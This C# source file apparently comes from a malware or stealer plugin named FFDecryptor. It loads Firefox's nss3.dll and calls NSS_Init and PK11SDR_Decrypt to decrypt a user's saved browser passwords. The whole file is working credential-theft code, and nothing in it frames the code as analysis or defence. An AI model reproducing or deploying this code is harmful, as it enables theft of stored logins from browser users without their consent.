using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Plugin.Browsers.Firefox
{
    static class FFDecryptor
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string dllFilePath);
        static IntPtr NSS3;
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long DLLFunctionDelegate(string configdir);
        public static long NSS_Init(string configdir)
        {
            try
            {
                string str;
            if (Directory.Exists("C:\\Program Files\\Mozilla Firefox"))
            {
                str = "C:\\Program Files\\Mozilla Firefox\\";
            }
            else if (Directory.Exists("C:\\Program Files (x86)\\Mozilla Firefox"))
            {
                str = "C:\\Program Files (x86)\\Mozilla Firefox\\";
            }
            else
            {
                str = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
            }
            FFDecryptor.LoadLibrary(str + "mozglue.dll");
            FFDecryptor.NSS3 = FFDecryptor.LoadLibrary(str + "nss3.dll");
            return ((FFDecryptor.DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(FFDecryptor.GetProcAddress(FFDecryptor.NSS3, "NSS_Init"), typeof(FFDecryptor.DLLFunctionDelegate)))(configdir);
            }
            catch (Exception ex)
            {
                return 0;
            }
        }

        public static string Decrypt(string cypherText)
        {
            IntPtr ffDataUnmanagedPointer = IntPtr.Zero;
            StringBuilder sb = new StringBuilder(cypherText);

            try
            {
                byte[] ffData = Convert.FromBase64String(cypherText);

                ffDataUnmanagedPointer = Marshal.AllocHGlobal(ffData.Length);
                Marshal.Copy(ffData, 0, ffDataUnmanagedPointer, ffData.Length);

                TSECItem tSecDec = new TSECItem();
                TSECItem item = new TSECItem();
                item.SECItemType = 0;
                item.SECItemData = ffDataUnmanagedPointer;
                item.SECItemLen = ffData.Length;

                if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
                {
                    if (tSecDec.SECItemLen != 0)
                    {
                        byte[] bvRet = new byte[tSecDec.SECItemLen];
                        Marshal.Copy(tSecDec.SECItemData, bvRet, 0, tSecDec.SECItemLen);
                        return Encoding.ASCII.GetString(bvRet);
                    }
                }
            }
            catch
            {
                return null;
            }
            finally
            {
                if (ffDataUnmanagedPointer != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(ffDataUnmanagedPointer);

                }
            }

            return null;
        }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);
        public static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
        {
            IntPtr pProc = GetProcAddress(NSS3, "PK11SDR_Decrypt");
            DLLFunctionDelegate5 dll = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate5));
            return dll(ref data, ref result, cx);
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct TSECItem
        {
            public int SECItemType;
            public IntPtr SECItemData;
            public int SECItemLen;
        }
    }

}